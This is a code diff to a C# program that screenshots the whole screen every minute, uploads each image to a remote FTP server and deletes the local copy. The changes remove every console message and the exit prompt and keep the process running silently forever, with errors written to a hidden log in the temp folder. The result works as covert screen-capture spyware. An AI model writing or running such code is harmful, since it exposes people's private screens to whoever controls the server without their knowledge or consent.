@@ -3,6 +3,7 @@ using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Net;
+using System.Threading;
 using System.Timers;
 using System.Windows.Forms;
 
@@ -13,12 +14,12 @@ class Program
     private static readonly string FtpUsername = "your_username";
     private static readonly string FtpPassword = "your_password";
     private static readonly string LocalSaveDirectory = Path.Combine(Path.GetTempPath(), "Screenshots");
+    private static readonly string LogFile = Path.Combine(Path.GetTempPath(), "ScreenshotUploader.log");
 
     private static System.Timers.Timer aTimer;
 
     static void Main()
     {
-        Console.WriteLine("Screenshot Uploader Started. Press any key to exit.");
         Directory.CreateDirectory(LocalSaveDirectory);
 
         aTimer = new System.Timers.Timer(60000); // 60 seconds
@@ -26,7 +27,8 @@ class Program
         aTimer.AutoReset = true;
         aTimer.Enabled = true;
 
-        Console.ReadKey();
+        // Keep the main thread alive for the background process
+        Thread.Sleep(Timeout.Infinite);
     }
 
     private static void OnTimedEvent(Object source, ElapsedEventArgs e)
@@ -34,14 +36,12 @@ class Program
         try
         {
             string filePath = CaptureScreenAndSave(LocalSaveDirectory);
-            Console.WriteLine($"Screenshot saved to {filePath}");
-
             string remoteUri = $"{FtpHost}/screenshots/{Path.GetFileName(filePath)}";
             UploadFileFtp(filePath, remoteUri, FtpUsername, FtpPassword);
         }
         catch (Exception ex)
         {
-            Console.WriteLine($"An error occurred: {ex.Message}");
+            Log($"An error occurred: {ex.ToString()}");
         }
     }
 
@@ -81,15 +81,29 @@ class Program
 
             using (FtpWebResponse response = (FtpWebResponse)request.GetResponse())
             {
-                Console.WriteLine($"Upload File Complete, status {response.StatusDescription}");
+                // Success, do nothing.
             }
 
             File.Delete(localFilePath);
-            Console.WriteLine($"Local file {localFilePath} deleted.");
         }
         catch (Exception ex)
         {
-            Console.WriteLine($"FTP Upload Failed: {ex.Message}");
+            Log($"FTP Upload Failed: {ex.ToString()}");
+            // Rethrow the exception to be caught by the main event handler's catch block.
+            throw;
+        }
+    }
+
+    private static void Log(string message)
+    {
+        try
+        {
+            string logMessage = $"{DateTime.Now:yyyy-MM-dd HH:mm:ss} - {message}";
+            File.AppendAllText(LogFile, logMessage + Environment.NewLine);
+        }
+        catch
+        {
+            // If logging fails, there's not much else to do in a background app.
         }
     }
 }
